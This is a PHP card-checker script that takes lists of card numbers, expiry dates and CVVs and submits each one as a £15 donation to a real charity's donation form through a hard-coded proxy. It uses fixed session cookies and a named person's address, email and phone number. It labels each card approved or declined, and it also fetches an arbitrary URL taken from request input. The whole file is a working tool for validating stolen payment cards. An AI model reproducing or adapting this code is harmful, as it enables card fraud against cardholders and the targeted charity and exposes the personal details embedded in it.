<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
$name = multiexplode(array(":", "|", ""), $lista)[4];
$surname = multiexplode(array(":", "|", ""), $lista)[5];
$email = multiexplode(array(":", "|", ""), $lista)[6];
$random = multiexplode(array(":", "|", ""), $lista)[7];

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$url = $_POST['1'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://api.festserbers.com/getrandom.php');
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
curl_setopt($ch, CURLOPT_PROXY, '51.15.56.31:8888');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_exec ($ch); 
$curl_scraped_page = curl_exec($ch);
curl_close($ch);

echo $curl_scraped_page;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.cpre.org.uk/page/34308/donate/2');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Cookie: JSESSIONID=W9jy3_2SmVFHcCCYjBXxd05Ygmm0AgG-ceb_pBaQ.Server10008; en_sessionId=b870246935b0440ba0c48f15ea5b0539-server10008; _ga=GA1.3.1718907156.1563429826; _gid=GA1.3.1233881032.1563429826; _fbp=fb.2.1563429826406.173258060; _gat_gtag_UA_1000609_1=1',
'Origin: https://donate.cpre.org.uk',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Referer: https://donate.cpre.org.uk/page/34308/donate/1?val&ea.tracking.id=cpre-web-promo'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'hidden=&sessionId=b870246935b0440ba0c48f15ea5b0539-server10008&ccjwt=&stripepk=&transaction.donationAmt=15&transaction.donationAmt.other=&transaction.paycurrency=GBP&transaction.paymenttype=visa&supporter.creditCardHolderName=Paul+Bautista&transaction.ccnumber='.$cc.'&transaction.ccexpire.delimiter=&transaction.ccexpire='.$mes.'&transaction.ccexpire='.$ano.'&transaction.ccvv='.$cvv.'&supporter.title=Mr&supporter.title.other=&supporter.firstName=Paul&supporter.lastName=Bautista&supporter.emailAddress=bautistapaul2372%40gmail.com&supporter.postcode=48075&supporter.address1=4695+Cherry+Ridge+Drive&supporter.address2=&supporter.city=Southfield&supporter.country=US&supporter.phoneNumber=&supporter.NOT_TAGGED_6=586-314-2814');
$fim = curl_exec($ch);



$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';



if(strpos($fim, 'OK') !== false) {
	echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
} else {
	echo '<span class="badge badge-danger">#Reprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
}


?>